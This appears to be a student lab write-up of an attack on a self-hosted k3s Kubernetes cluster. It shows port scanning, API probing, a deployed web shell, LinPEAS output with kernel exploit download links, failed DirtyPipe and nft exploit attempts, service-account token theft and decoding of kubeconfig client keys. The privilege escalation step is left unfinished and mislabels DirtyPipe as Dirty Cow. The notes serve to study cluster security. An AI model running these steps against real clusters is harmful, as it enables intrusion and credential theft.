Suppose we know the domain name of some application exposed to the internet and that application is deployed in a kubernetes cluster.

We start with enumerating :

nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 http://k3s-vm-1-m.aitbyteshome.net//16

```sh
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 
k3s-vm-1-m.aitbyteshome.net

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 22:11 CET
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 28.15% done; ETC: 22:11 (0:00:13 remaining)
Nmap scan report for k3s-vm-1-m.aitbyteshome.net (35.195.218.184)
Host is up (0.052s latency).
Other addresses for k3s-vm-1-m.aitbyteshome.net (not scanned): 64:ff9b::23c3:dab8
Not shown: 2780 filtered tcp ports (no-response)
PORT      STATE  SERVICE
6443/tcp  open   sun-sr-https

Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds
```

Ports 6443 is exposed. This is the API Kubernetes service the administrators talks with usually using the tool kubectl.

```sh
$ curl -k https://k3s-vm-1-m.aitbyteshome.net:6443/swaggerapi
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}                                                                                                       
 
$ curl -k https://k3s-vm-1-m.aitbyteshome.net:6443/healthz   
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}                                                                                                       
 
$ curl -k https://k3s-vm-1-m.aitbyteshome.net:6443/api/v1 
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}      

```


We can also try to get responses from common services:
The following commands send requests to the Kubelet API.  The kubelet is the primary "node agent" that runs on each node. It can register the node with the apiserver using one of: the hostname; a flag to override the hostname; or specific logic for a cloud provider.

```
$ curl -k https://k3s-vm-4-w.aitbyteshome.net:10250/pods
$ curl -k https://k3s-vm-4-w.aitbyteshome.net:10250/metrics
curl: (28) Failed to connect to k3s-vm-4-w.aitbyteshome.net port 10250 after 132981 ms: Could not connec
t to server
```

It does not seem to be exposed. Neither is the etd api, on port 2379. 

We keep this in mind in case we might come back to it later.

---

To make our job easier, we will suppose that the developers of the application left behind a vulnerability giving us RCE on the pod.
We simulate it by deploying the infamous **p0wny@shell** in the cluster.

![p0wny@shell](/home/a8taleb/dev/s9/Projet-Long/Infra/assets/2025-03-02-23-04-22.png)


Doing so we can execute a common enumeration tool called Linepeas.

That way we can gather some vital informations about the privilege escalation paths :

```sh
 ╔══════════╣ Executing Linux Exploit Suggester
 ╚ https://github.com/mzet-/linux-exploit-suggester
 [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

    Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
 https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Exposure: less probable
    Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
    Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

 [+] [CVE-2022-2586] nft_object UAF

    Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
    Exposure: less probable
    Tags: ubuntu=(20.04){kernel:5.12.13}
    Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

 [+] [CVE-2022-0847] DirtyPipe

    Details: https://dirtypipe.cm4all.com/
    Exposure: less probable
    Tags: ubuntu=(20.04|21.04),debian=11
    Download URL: https://haxx.in/files/dirtypipez.c

 [+] [CVE-2021-22555] Netfilter heap out-of-bounds write

    Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
    Exposure: less probable
    Tags: ubuntu=20.04{kernel:5.8.0-*}
    Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
    Comments: ip_tables kernel module must be loaded

```

All these vulnerabilities could potentially be used for privilege escalation but the most promising one might be DirtyPipe (CVE-2022-0847) due to its reliability and widespread impact when it works.

When trying to execute the priviledge escalation script for Dirty Cow it seems like there is a security mechanism stoping us from executing the `system` syscall :

```
# ./dirtycow/exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
system() function call seems to have failed :(
```

It would not be unreasonable to assume that GCP would not be shipping Linux images containings kernel vulneratbilities.

After failling to execute DirtyPipe on the pod, we tried nft_object UAF vulnerability without much success.

```
# gcc -o nft ./nft.c -l mnl -l nftnl -w
./nft.c:11:10: fatal error: libmnl/libmnl.h: No such file or directory
   11 | #include <libmnl/libmnl.h>
      |          ^~~~~~~~~~~~~~~~~
compilation terminated.
```

To move forth, we will try the same, but this time, we change the image of the VMs for older ones.

# TODO : Achieve Privilege escalation

Now that we have obtained root priviledges on the pod, we can access sensible files. Notably thoses under : `/run/secrets/kubernetes.io/serviceaccount`


```sh
# ls /run/secrets/kubernetes.io/serviceaccount
ca.crt  namespace  token
```

By getting access to the token, we get priviledged access to the kubernetes API.

```sh
$ export TOKEN=$(cat /var/run/secret/kubernetes.io/serviceaccount/token)
$ curl -k --header "Authorization: Bearer $TOKEN" https://k3s-vm-1-m.aitbyteshome.net:6443/api

{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "10.132.15.229:6443"
    }
  ]
```




---

We can recover any useful credential in the following manner :
```sh
$  cat ~/.kube/config | grep certificate-authority-data | sed 's/.*: //g' | >  base64 -d
$ cat ~/.kube/config | grep client-key-data | sed 's/.*: //g' | base64 -d
$ cat ~/.kube/config | grep client-certificate-data | sed 's/.*: //g' | base64 -d
```
